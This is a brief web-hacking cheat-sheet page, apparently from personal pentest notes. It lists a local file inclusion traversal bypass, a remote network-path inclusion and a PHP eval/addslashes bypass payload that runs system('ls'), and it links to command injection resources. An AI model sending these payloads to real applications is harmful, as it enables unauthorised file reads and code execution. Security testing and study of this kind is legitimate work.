---
title: "Web"
date: 2023-01-03
modified: 2023-03-03
draft: false
summary: "Attacking web applications."
---

{{< hacking-disclaimer >}}

## Local file inclusion

- `../` specific find/replace can be bypassed with `..//`
- e.g. `/uploads/%2e%2e/%2fsys/class/net/eth0/address` → `/uploads/..//sys/class/net/eth0/address`
- Resolve a network path = `http://host.tld/?page=//11.22.33.44/@OsandaMalith`

## PHP - Bypass `eval()` with `addslashes()`

Where a value from a URL is passed through `eval()` with `addslashes()`

POC: `?str=${eval($_GET[1])}&1=phpinfo();`

For example: `GET /?format=${eval($_GET[1])}&1=system('ls');`

[https://www.programmersought.com/article/30723400042/](https://www.programmersought.com/article/30723400042/)

## Command injection

### Characters

See <https://academy.hackthebox.com/module/109/section/1032>

### Resources

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
